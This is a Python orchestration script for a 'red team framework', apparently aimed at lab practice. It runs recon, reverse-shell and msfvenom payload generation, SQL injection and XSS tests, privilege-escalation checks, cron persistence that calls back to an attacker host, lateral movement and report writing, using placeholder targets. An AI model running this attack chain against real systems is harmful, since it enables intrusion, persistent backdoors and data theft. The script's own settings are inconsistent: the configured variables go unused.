from exploitation.payload_generator import generate_reverse_shell, generate_msfvenom_payload
from exploitation.vuln_scanner import scan_services_for_vulns
from exploitation.web_attacks import test_sqli, test_xss, dir_bruteforce
from recon.subdomain_enum import enumerate_subdomains
from recon.port_scanner import scan_ports
from recon.osint import shodan_lookup, get_emails
from recon.github_leak import search_github_leaks
from post_exploit.privesc import check_sudo_permissions, find_suid_binaries, check_cron_jobs, system_info
from post_exploit.persistence import add_cron_persistence, check_existing_persistence
from post_exploit.lateral_movement import discover_network_hosts, show_lateral_movement_techniques
from reporting.report_generator import generate_full_report
from rich.console import Console
import json

console = Console()


def run_recon(target_domain, target_ip=None, shodan_key=None):
    console.print(f"\n[bold red]==============================[/bold red]")
    console.print(f"[bold red]  RED TEAM FRAMEWORK - RECON  [/bold red]")
    console.print(f"[bold red]==============================[/bold red]\n")

    results = {"domain": target_domain, "recon": {}}

    # Step 1: Subdomain enumeration
    console.print("[bold yellow][*] STEP 1: Subdomain Enumeration[/bold yellow]")
    subdomains = enumerate_subdomains(target_domain)
    results['recon']['subdomains'] = subdomains
    console.print(f"[green][+] Total subdomains found: {len(subdomains)}[/green]\n")

    # Step 2: Port scan
    if target_ip:
        console.print("[bold yellow][*] STEP 2: Port Scanning[/bold yellow]")
        ports = scan_ports(target_ip)
        results['recon']['ports'] = ports

    # Step 3: Shodan lookup
    if target_ip and shodan_key:
        console.print("\n[bold yellow][*] STEP 3: Shodan OSINT[/bold yellow]")
        shodan_data = shodan_lookup(target_ip, shodan_key)
        results['recon']['shodan'] = shodan_data

    # Step 4: Email harvest
    console.print("\n[bold yellow][*] STEP 4: Email Harvesting[/bold yellow]")
    emails = get_emails(target_domain)
    results['recon']['emails'] = emails

    # Step 5: GitHub leaks
    console.print("\n[bold yellow][*] STEP 5: GitHub Leak Search[/bold yellow]")
    leaks = search_github_leaks(target_domain)
    results['recon']['github_leaks'] = leaks

    # Save results
    with open('recon_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    console.print("\n[bold green][+] Recon complete! Results saved to recon_results.json[/bold green]")

    return results


def run_exploitation(port_results, lhost, target_url=None):
    console.print(f"\n[bold red]==================================[/bold red]")
    console.print(f"[bold red]  RED TEAM FRAMEWORK - EXPLOIT   [/bold red]")
    console.print(f"[bold red]==================================[/bold red]\n")

    results = {}

    # Step 1: CVE scanning based on open ports
    console.print("[bold yellow][*] STEP 1: CVE Scanning Open Services[/bold yellow]")
    vulns = scan_services_for_vulns(port_results)
    results['vulnerabilities'] = vulns

    # Step 2: Generate payloads
    console.print("\n[bold yellow][*] STEP 2: Generating Payloads[/bold yellow]")
    generate_reverse_shell(lhost, 4444, "bash")
    generate_reverse_shell(lhost, 4444, "python")
    generate_msfvenom_payload(lhost, 4444, "linux")

    # Step 3: Web attacks
    if target_url:
        console.print("\n[bold yellow][*] STEP 3: Web Vulnerability Testing[/bold yellow]")
        dirs = dir_bruteforce(target_url)
        results['dirs'] = dirs
        test_sqli(target_url, "id")
        test_xss(target_url, "search")

    # Save results
    with open('exploitation_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    console.print("\n[bold green][+] Exploitation phase complete![/bold green]")

    return results


def run_post_exploitation(lhost, lport, subnet=None):
    console.print(f"\n[bold red]====================================[/bold red]")
    console.print(f"[bold red]  RED TEAM FRAMEWORK - POST EXPLOIT [/bold red]")
    console.print(f"[bold red]====================================[/bold red]\n")

    results = {}

    # Step 1: System info
    console.print("[bold yellow][*] STEP 1: System Enumeration[/bold yellow]")
    info = system_info()
    results['system_info'] = list(info.keys())

    # Step 2: Privilege escalation checks
    console.print("\n[bold yellow][*] STEP 2: Privilege Escalation Checks[/bold yellow]")
    sudo_perms = check_sudo_permissions()
    suid_bins = find_suid_binaries()
    crons = check_cron_jobs()
    results['privesc'] = {
        'suid_exploitable': suid_bins,
        'cron_jobs': crons
    }

    # Step 3: Persistence
    console.print("\n[bold yellow][*] STEP 3: Persistence Methods[/bold yellow]")
    cron_payload = add_cron_persistence(lhost, lport)
    existing = check_existing_persistence()
    results['persistence'] = existing

    # Step 4: Lateral movement
    console.print("\n[bold yellow][*] STEP 4: Lateral Movement[/bold yellow]")
    show_lateral_movement_techniques()
    if subnet:
        hosts = discover_network_hosts(subnet)
        results['lateral_hosts'] = hosts

    # Save
    with open('post_exploit_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    console.print("\n[bold green][+] Post exploitation phase complete![/bold green]")

    return results


def run_reporting(recon_data, exploit_data, post_data, target, tester, company):
    console.print(f"\n[bold red]===================================[/bold red]")
    console.print(f"[bold red]  RED TEAM FRAMEWORK - REPORTING  [/bold red]")
    console.print(f"[bold red]===================================[/bold red]\n")

    output_file = generate_full_report(
        target=target,
        tester=tester,
        company=company,
        recon_data=recon_data,
        exploit_data=exploit_data,
        post_data=post_data,
        output_file="pentest_report.pdf"
    )
    console.print(f"[bold green][+] Report generated: {output_file}[/bold green]")
    return output_file


if __name__ == "__main__":

    # ==============================
    # CONFIGURE YOUR TARGET HERE
    # ==============================
    TARGET_DOMAIN ="Domain-Name.com"            # domain for recon
    TARGET_IP = "Target_IP"              # your THM machine IP
    SHODAN_KEY = "Shoden API Key"     # your shodan API key
    KALI_IP = "Your-KALI_IP-ADDR"             # your kali IP (run: hostname -I)
    TARGET_URL = "http://Target-URL.com"      # target web URL
    SUBNET = "xx.xx.xx.0/24"              #  subnet
    TESTER_NAME = "Your_NAME"              # your name for report
    COMPANY_NAME = "YOUR_Company"          # company name for report

    # Phase 1 - Recon
    recon_data = run_recon(
        target_domain="Domain-name.com",
        target_ip="Target-IP-ADDR",
        shodan_key="Shoden API KEY"
    )

    # Phase 2 - Exploitation
    exploit_data = run_exploitation(
        port_results=recon_data['recon'].get('ports', []),
        lhost="Your_target_IP",
        target_url="http://Target_Company.com"
    )

    # Phase 3 - Post Exploitation
    post_data = run_post_exploitation(
        lhost="Your KALI_IP",
        lport=4444,
        subnet=SUBNET
    )

    # Phase 4 - Reporting
    run_reporting(
        recon_data=recon_data,
        exploit_data=exploit_data,
        post_data=post_data,
        target="Target_IP",
        tester="Your_Name",
        company="Company_NAME-For REport"
    )

    console.print("\n[bold green]========================================[/bold green]")
    console.print("[bold green]   ALL PHASES COMPLETE! 🔥               [/bold green]")
    console.print("[bold green]   Results saved:                        [/bold green]")
    console.print("[bold green]   - recon_results.json                  [/bold green]")
    console.print("[bold green]   - exploitation_results.json           [/bold green]")
    console.print("[bold green]   - post_exploit_results.json           [/bold green]")
    console.print("[bold green]   - pentest_report.pdf                  [/bold green]")
    console.print("[bold green]========================================[/bold green]")
